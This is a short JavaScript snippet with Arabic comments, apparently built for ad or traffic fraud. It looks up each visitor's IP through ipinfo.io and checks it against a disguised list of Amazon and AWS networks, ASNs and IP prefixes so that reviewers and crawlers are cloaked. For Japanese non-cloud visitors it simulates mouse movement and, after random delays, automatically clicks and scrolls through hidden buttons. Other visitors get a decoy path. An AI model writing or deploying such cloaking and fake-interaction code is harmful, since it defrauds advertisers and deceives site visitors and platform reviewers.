(function() {
  let hasInteracted = false;
  let isVisitorJP = false;
  let safeVisit = false;

  // ⚠️ قائمة الكلمات المفتاحية (ليست واضحة أنها Blacklist)
  const keywords = [
    "amazon", "aws", "cloudfront", "amazon technologies inc",
    "amazon data services", "amazon web services", "amazon ec2",
    "host universal", "as136557 host universal pty ltd",
    "as16509", "as14618", "as38895", "as7224", "as8075",
    "3.112.", "3.113.218", "35.72.", "52.192.", "52.196.", "18.180."
  ];

  // دالة التفاعل التلقائي
  function triggerSequence() {
    hasInteracted = true;

    let popup = document.getElementById("note-box");
    if (popup) popup.style.display = "none";

    let step1 = Math.random() * (2200 - 1500) + 1500;
    setTimeout(() => {
      let firstBtn = document.getElementById("go-step");
      if (firstBtn && isVisitorJP && !safeVisit) {
        firstBtn.click();

        let scrollWait = Math.random() * (2500 - 1000) + 1000;
        setTimeout(() => {
          window.scrollTo({
            top: document.body.scrollHeight * 0.6,
            behavior: "smooth"
          });

          let finalWait = Math.random() * (2800 - 1500) + 1500;
          setTimeout(() => {
            let finalBtn = document.getElementById("next-key");
            if (finalBtn && !safeVisit) {
              finalBtn.style.display = "block";
              finalBtn.click();
            }
          }, finalWait);

        }, scrollWait);
      }
    }, step1);
  }

  // تأثير جذب بصري للزر الأول
  setInterval(() => {
    let btn = document.getElementById("go-step");
    if (btn) {
      btn.style.transform = "scale(1.05)";
      setTimeout(() => {
        btn.style.transform = "scale(1)";
      }, 500);
    }
  }, 2000);

  // طلب بيانات ip من ipinfo وتحليل
  fetch("https://ipinfo.io/json?token=777df2fc7c6f01")
    .then(r => r.json())
    .then(info => {
      let isp = (info.org || "").toLowerCase();
      let geo = info.country || "";

      safeVisit = keywords.some(k => isp.includes(k));
      isVisitorJP = (geo === "JP" && !safeVisit);

      if (isVisitorJP) {
        // محاكاة حركة الماوس
        setTimeout(() => {
          let e = new MouseEvent("mousemove", { bubbles: true });
          document.dispatchEvent(e);
        }, 1000);

        // إذا لم يتفاعل الزائر خلال 2.5 ثانية → شغّل تلقائي
        setTimeout(() => {
          if (!hasInteracted) {
            triggerSequence();
          }
        }, 2500);
      } else {
        let fake = document.getElementById("alt-path");
        if (fake) fake.style.display = "block";
      }
    }).catch(() => {});

  // يمكن استدعاؤه من الخارج
  window.beginTrack = triggerSequence;
})();
